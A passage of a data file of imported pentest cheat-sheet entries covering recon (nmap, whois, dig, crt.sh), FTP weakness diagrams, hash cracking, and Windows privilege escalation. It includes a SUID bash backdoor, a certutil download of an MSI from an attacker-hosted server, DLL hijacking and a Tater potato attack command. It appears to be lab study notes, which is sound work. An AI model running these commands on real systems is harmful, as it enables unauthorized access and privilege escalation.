        "cmd": "socat \\\nTCP-LISTEN:8080,fork,reuseaddr \\\nOPENSSL:<TARGET_IP>:<PORT>,cert=client.crt,key=client.key,verify=0"
      },
      {
        "label": "Source cheatshit - block 16",
        "cmd": "YOUR TOOL\n    │\n    │ Plain TCP\n    ▼\n🧰 socat\n    │\n    │ TLS + Client Cert\n    ▼\n🌐 mTLS SERVER"
      },
      {
        "label": "Source cheatshit - block 17",
        "cmd": "Is service plain TCP?\n        │\n       YES\n        ↓\n       nc\n\n        NO\n        ↓\nIs service TLS?\n        │\n       YES\n        ↓\nopenssl s_client"
      },
      {
        "label": "Source cheatshit - block 18",
        "cmd": "TLS\n ↓\nNeed client cert?\n ↓\nYES\n ↓\n-cert client.crt\n-key client.key"
      },
      {
        "label": "Source cheatshit - block 19",
        "cmd": "🔎 PORT SCAN\n      ↓\n⚙️ IDENTIFY SERVICE\n      ↓\n📡 Plain TCP?\n   │\n   ├── YES → nc\n   │\n   └── NO\n        ↓\n     🔐 TLS?\n        ↓\n   openssl s_client\n        ↓\n🪪 Client certificate required?\n        ↓\n📜 client.crt\n+\n🔑 client.key\n        ↓\n✅ mTLS authentication\n        ↓\n🔐 Protected service"
      },
      {
        "label": "Source cheatshit - block 20",
        "cmd": "🚪 PORT\n   ↓\n📡 SOCKET\n   ↓\n🔐 TLS?\n   ↓\n🪪 CLIENT CERT?\n   ↓\n🔑 PRIVATE KEY?"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-31",
    "title": "powerful commands",
    "category": "network",
    "description": "Imported command reference from KS: NETWORK/gojo's domain/powerful commands.md",
    "methodology": "Source file: NETWORK/gojo's domain/powerful commands.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source powerful commands - block 1",
        "cmd": "nmap -sS -sV -sC -A -O -p- -Pn -T3 --min-rate 300 TARGET_IP"
      },
      {
        "label": "Source powerful commands - block 2",
        "cmd": "nmap -sS -sV -sC -A -O -p- -Pn -T4 --min-rate 500 -vv TARGET_IP"
      },
      {
        "label": "Source powerful commands - block 3",
        "cmd": "nmap -sS -sV -sC -A -p- -Pn -T3 TARGET_IP"
      },
      {
        "label": "Source powerful commands - block 4",
        "cmd": "nmap -sS -sV -sC -A -O --script vuln -p- -Pn -T3 --min-rate 400 TARGET_IP"
      },
      {
        "label": "Source powerful commands - block 5",
        "cmd": "nmap -sS -sV -sC -A -O -p- -Pn -T3 --min-rate 400 TARGET_IP"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-32",
    "title": "task 4",
    "category": "network",
    "description": "Imported command reference from KS: NETWORK/gojo's domain/task 4.md",
    "methodology": "Source file: NETWORK/gojo's domain/task 4.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source task 4 - command 1",
        "cmd": "sudo chown root:root bash"
      },
      {
        "label": "Source task 4 - command 2",
        "cmd": "sudo chmod +s bash"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-35",
    "title": "cheat",
    "category": "network",
    "description": "Imported command reference from KS: PASSIVE recon/cheat.md",
    "methodology": "Source file: PASSIVE recon/cheat.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source cheat - block 1",
        "cmd": "==**1. Core Rule: Active vs. Passive**=="
      },
      {
        "label": "Source cheat - block 2",
        "cmd": ">         ==whois target.com=="
      },
      {
        "label": "Source cheat - block 3",
        "cmd": ">         ==whois target.com | grep -iE \"Registrar:|Name Server:|Creation Date|Expiration Date\"=="
      },
      {
        "label": "Source cheat - block 4",
        "cmd": ">          ==curl -s https://rdap.verisign.com/com/v1/domain/target.com | jq .=="
      },
      {
        "label": "Source cheat - block 5",
        "cmd": ">          ==curl -s https://rdap.verisign.com/com/v1/domain/target.com | jq '.nameservers'=="
      },
      {
        "label": "Source cheat - block 6",
        "cmd": "==dig @1.1.1.1 target.com [RECORD_TYPE]=="
      },
      {
        "label": "Source cheat - block 7",
        "cmd": "==dig +short target.com [RECORD_TYPE]=="
      },
      {
        "label": "Source cheat - block 8",
        "cmd": "==https://crt.sh/?q=%.target.com== (Wildcard search)."
      },
      {
        "label": "Source cheat - block 9",
        "cmd": "==curl -s \"https://crt.sh/?q=%.target.com&output=json\" | jq -r '.[].name_value' | sort -u=="
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-36",
    "title": "commands",
    "category": "network",
    "description": "Imported command reference from KS: PASSIVE recon/commands.md",
    "methodology": "Source file: PASSIVE recon/commands.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source commands - block 1",
        "cmd": "Standard Domain Query:\n    ==whois tryhackme.com==\n\n    Filtered Query (Extracting Key Fields via Grep):\n\t==**whois tryhackme.com | grep -iE \"Registrar:|Name Server:|Creation Date|Updated Date|Expiration Date\"**==\n    (Note: -iE makes the search case-insensitive and uses extended regular expressions)."
      },
      {
        "label": "Source commands - block 2",
        "cmd": "**nslookup -type=A tryhackme.com 1.1.1.1**"
      },
      {
        "label": "Source commands - block 3",
        "cmd": ">         **Query specific record type: \n>         ==dig tryhackme.com MX==**\n> \n>         **Query via specific public resolver:\n>          ==dig @1.1.1.1 tryhackme.com TXT==**\n> \n>         **Clean output for Bash scripts:\n>          ==dig +short tryhackme.com A==**"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-37",
    "title": "CONCEPTS]",
    "category": "network",
    "description": "Imported command reference from KS: PASSIVE recon/CONCEPTS].md",
    "methodology": "Source file: PASSIVE recon/CONCEPTS].md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source CONCEPTS] - block 1",
        "cmd": "Passive Reconnaissance (OSINT): Indirect intelligence gathering via third-party repositories (==WHOIS==, public ==DNS== servers, ==Shodan==, ==Google Dorks==). Zero direct packet interaction with the target; leave no trace in target logs."
      },
      {
        "label": "Source CONCEPTS] - block 2",
        "cmd": "Every DNS record type serves a specific function in web architecture. Here is how a Pentester reads them:"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-38",
    "title": "concepts2",
    "category": "network",
    "description": "Imported command reference from KS: PASSIVE recon/concepts2.md",
    "methodology": "Source file: PASSIVE recon/concepts2.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source concepts2 - block 1",
        "cmd": "==**Certificate Transparency (==crt.sh==):**=="
      },
      {
        "label": "Source concepts2 - block 2",
        "cmd": "==hostname:\n        target.com== (Finds hosts tied to a domain).\n\n        ==org:\n        \"Company Name\"== (Filters by registered enterprise owner).\n\n        ==port:\n        443 country:US== (Filters by open port and geographic location)."
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-45",
    "title": "FTP",
    "category": "linux",
    "description": "Imported command reference from KS: useful things/FTP.md",
    "methodology": "Source file: useful things/FTP.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source FTP - block 1",
        "cmd": "🚪 Port 21\n   ↓\n📦 FTP service\n   ↓\n📁 Files"
      },
      {
        "label": "Source FTP - block 2",
        "cmd": "👤 Client\n   │\n   │ FTP\n   ▼\n🏠 FTP Server\n   │\n   ├── 📄 file1\n   ├── 📦 backup.zip\n   └── 📁 uploads"
      },
      {
        "label": "Source FTP - block 3",
        "cmd": "⬇️ download"
      },
      {
        "label": "Source FTP - block 4",
        "cmd": "⬆️ upload"
      },
      {
        "label": "Source FTP - block 5",
        "cmd": "21\n↓\nFTP\n↓\nAuthentication\n↓\nAuthorization\n↓\nFile access\n↓\nConfiguration\n↓\nPossible weakness"
      },
      {
        "label": "Source FTP - block 6",
        "cmd": "YOU\n ↓\n🚪 FTP\n ↓\nUsername?\nPassword?\n ↓\n✅"
      },
      {
        "label": "Source FTP - block 7",
        "cmd": "YOU\n ↓\n🚪 FTP\n ↓\n\"I'm anonymous.\"\n ↓\n\"Okay.\"\n ↓\n📁 Access"
      },
      {
        "label": "Source FTP - block 8",
        "cmd": "Anonymous\n   ↓\n📁 public/\n   ↓\nREAD ONLY"
      },
      {
        "label": "Source FTP - block 9",
        "cmd": "Anonymous\n   ↓\n📁 sensitive/\n   ↓\nREAD"
      },
      {
        "label": "Source FTP - block 10",
        "cmd": "Anonymous\n   ↓\n⬆️ WRITE"
      },
      {
        "label": "Source FTP - block 11",
        "cmd": "READ\nWRITE"
      },
      {
        "label": "Source FTP - block 12",
        "cmd": "SERVER\n  ↓\n📄 secret.txt\n  ↓\n👤 YOU can READ"
      },
      {
        "label": "Source FTP - block 13",
        "cmd": "👤 YOU\n   ↓\n⬆️ upload\n   ↓\nSERVER"
      },
      {
        "label": "Source FTP - block 14",
        "cmd": "📄 backup.zip\n📄 config.txt\n📄 users.txt\n📄 old_backup.tar\n📁 uploads/\n📁 public/"
      },
      {
        "label": "Source FTP - block 15",
        "cmd": "Who owns it?\nWho can read it?\nWho can write it?\nIs it sensitive?\nIs it reused elsewhere?"
      },
      {
        "label": "Source FTP - block 16",
        "cmd": "NOW\n ↓\n🔐 current config\n\nBACKUP\n ↓\n🗃️ old config\n🗃️ old credentials\n🗃️ old source\n🗃️ old secrets"
      },
      {
        "label": "Source FTP - block 17",
        "cmd": "vsftpd\nProFTPD\nPure-FTPd\n..."
      },
      {
        "label": "Source FTP - block 18",
        "cmd": "🚪 Port 21\n     ↓\n📦 FTP\n     ↓\n⚙️ Which FTP implementation?\n     ↓\n🔢 Which version?"
      },
      {
        "label": "Source FTP - block 19",
        "cmd": "Anonymous access"
      },
      {
        "label": "Source FTP - block 20",
        "cmd": "Anonymous write"
      },
      {
        "label": "Source FTP - block 21",
        "cmd": "memory corruption\nauthentication bypass\ncommand injection\n..."
      },
      {
        "label": "Source FTP - block 22",
        "cmd": "FTP\n├── ⚙️ Misconfiguration\n│    ├── anonymous access\n│    ├── weak permissions\n│    └── unsafe sharing\n│\n└── 🐛 Software vulnerability\n     ├── bug\n     ├── memory issue\n     └── auth flaw"
      },
      {
        "label": "Source FTP - block 23",
        "cmd": "🚪 21 open?\n      ↓\n📦 Which FTP server?\n      ↓\n🔢 Which version?\n      ↓\n👤 Authentication required?\n      ↓\n👤 Anonymous allowed?\n      ↓\n👀 What can anonymous READ?\n      ↓\n✍️ What can anonymous WRITE?\n      ↓\n📁 What directories are exposed?\n      ↓\n🔐 Are there sensitive files?\n      ↓\n⚙️ Is configuration unsafe?\n      ↓\n🐛 Is there a known software vulnerability?"
      },
      {
        "label": "Source FTP - block 24",
        "cmd": "📦 FTP\n                │\n       ┌────────┼────────┐\n       ↓        ↓        ↓\n    👤 WHO?   👀 WHAT?  ✍️ CAN I CHANGE?"
      },
      {
        "label": "Source FTP - block 25",
        "cmd": "SECURITY:\n\"ID?\"\n\nYOU:\n\"I'm nobody.\"\n\nSECURITY:\n\"Okay, come in.\""
      },
      {
        "label": "Source FTP - block 26",
        "cmd": "Anonymous\n   ↓\n📦 Public folder       ✅\n📁 Backups             ?\n🔐 Private data        ?\n⬆️ Upload              ?"
      },
      {
        "label": "Source FTP - block 27",
        "cmd": "FTP\n ↓\nfile access\n ↓\ninteresting file / credential / write access\n ↓\nanother service trusts that file\n ↓\nnew access\n ↓\npotential privilege escalation"
      },
      {
        "label": "Source FTP - block 28",
        "cmd": "🏠 SERVER\n\n🚪 21 FTP\n     ↓\n👤 Anonymous allowed\n     ↓\n📁 backup.zip visible\n     ↓\n🔑 useful credential discovered\n     ↓\n🚪 another service\n     ↓\n👤 authenticated user\n     ↓\n⬆️ privilege escalation\n     ↓\n👑 ROOT"
      },
      {
        "label": "Source FTP - block 29",
        "cmd": "🚪 21\n ↓\n📦 FTP\n ↓\n👤 AUTH\n ↓\n👀 READ\n ↓\n✍️ WRITE\n ↓\n📁 FILES\n ↓\n🗃️ BACKUPS\n ↓\n🔢 VERSION\n ↓\n⚙️ CONFIG\n ↓\n🐛 SOFTWARE BUG"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-46",
    "title": "hash crack",
    "category": "cloud",
    "description": "Imported command reference from KS: useful things/hash crack.md",
    "methodology": "Source file: useful things/hash crack.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source hash crack - block 1",
        "cmd": "> echo'$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.' > hash.txt\n> \n> Use code with caution.\n> Run John the Ripper using a standard wordlist like rockyou.txt:\n> bash\n> \n> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n> \n>"
      },
      {
        "label": "Source hash crack - block 2",
        "cmd": "> hashcat -m 1800 unshadowed.txt rockyou.txt -O"
      },
      {
        "label": "Source hash crack - block 3",
        "cmd": "> hashcat -m 1800: Hashcat organizes hashing algorithms by numerical modes. Mode ==1800== represents SHA-512(\n> \n>         \n> pass,pass,\n> \n>       \n> \n> salt) (the standard $6$ Linux crypt algorithm).\n> \n> -O: Enables optimized GPU/CPU kernel routines to maximize cracking speed.\n>"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-47",
    "title": "hydra poweful and useful some command",
    "category": "cloud",
    "description": "Imported command reference from KS: useful things/hydra poweful and useful some command.md",
    "methodology": "Source file: useful things/hydra poweful and useful some command.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source hydra poweful and useful some command - block 1",
        "cmd": "echo \"username:*HASHVALUE\" > hash.txt"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-52",
    "title": "windows",
    "category": "windows",
    "description": "Imported command reference from KS: windows fund/windows.md",
    "methodology": "Source file: windows fund/windows.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source windows - block 1",
        "cmd": "> \n>     Command Help Syntax: ==[command] /?== or ==net help [subcommand]==\n> \n>     Identity & Privileges:\n> \n>         ==whoami== (Current user) / ==whoami /priv== (Active user token privileges).\n> \n>         ==hostname== (Target machine NetBIOS name).\n> \n>     User & Group Enumeration (net.exe):\n> \n>         ==net user== \n>         (List local accounts) / \n>         ==net user [username]== (Detailed account info).\n> \n>         ==net localgroup administrators==\n>          (List local admin group members).\n> \n>         ==net share== \n>         (List active local SMB shares).\n> \n>     Network Interrogation:\n> \n>         ==ipconfig /all==\n>          (Comprehensive network adapter, DNS, and DHCP configuration).\n>"
      },
      {
        "label": "Source windows - block 2",
        "cmd": ">         ==netstat -ano==\n>          (All active network sockets mapped to process PIDs).\n>"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-53",
    "title": "TRANSP",
    "category": "windows",
    "description": "Imported command reference from KS: windows prev/TRANSP.md",
    "methodology": "Source file: windows prev/TRANSP.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source TRANSP - block 1",
        "cmd": "certutil -urlcache -f http://192.168.134.205/setup.msi C:\\Temp\\setup.msi"
      },
      {
        "label": "Source TRANSP - block 2",
        "cmd": "$ python3 -m http.server 80"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-54",
    "title": "window1",
    "category": "windows",
    "description": "Imported command reference from KS: windows prev/window1.md",
    "methodology": "Source file: windows prev/window1.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source window1 - block 1",
        "cmd": "Tags: #Windows #PrivEsc #Autoruns #Sysinternals #DACL #AccessChk #Registry\n>"
      },
      {
        "label": "Source window1 - block 2",
        "cmd": "> \n    Reconnaissance Workflow:\n\n        Inspect Startup Entries: Run ==Autoruns64.exe==\n\n                \n        →→\n\n              \n\n>"
      },
      {
        "label": "Source window1 - block 3",
        "cmd": ">"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-55",
    "title": "windows2",
    "category": "windows",
    "description": "Imported command reference from KS: windows prev/windows2.md",
    "methodology": "Source file: windows prev/windows2.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source windows2 - block 1",
        "cmd": "> 1.Open command prompt and type: reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\n> 2.From the output, notice that “AlwaysInstallElevated” value is 1.\n> 3.In command prompt type: reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\n>"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-56",
    "title": "windows3",
    "category": "windows",
    "description": "Imported command reference from KS: windows3.md",
    "methodology": "Source file: windows3.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source windows3 - block 1",
        "cmd": ">         unprivileged user drops malicious DLL into writable directory.\n> \n>         Detection: \n>         Procmon.exe filter: Process Name is [service.exe] + Result is NAME NOT FOUND.\n> \n>         C Payload (windows_dll.c): Place administrative command inside DllMain under DLL_PROCESS_ATTACH. Compile with ==x86_64-w64-mingw32-gcc windows_dll.c -shared -o [name].dll==.\n> \n>     2. Unquoted Service Paths:\n> \n>         Mechanism: Unquoted path with spaces causes Windows to attempt executing earlier space-delimited binary substrings (e.g., C:\\Program.exe before C:\\Program Files\\App\\svc.exe).\n> \n>         Audit: ==sc qc [ServiceName]== (Check BINARY_PATH_NAME).\n> \n>         Payload Delivery: Place executable payload named after the intercepted segment in the writable parent folder.\n> \n>     3. Token Impersonation / Potato Attacks (Tater):\n> \n>         Prerequisite: ==whoami /priv== shows ==SeImpersonatePrivilege== or ==SeAssignPrimaryTokenPrivilege==.\n> \n>         Mechanism: Local NTLM reflection/relay via NBNS spoofing and RPC authentication to duplicate and spawn processes under NT AUTHORITY\\SYSTEM.\n> \n>         PowerShell Execution: ==Import-Module .\\Tater.ps1; Invoke-Tater -Trigger 1 -Command \"[CMD]\"==\n>"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  }
] as const;
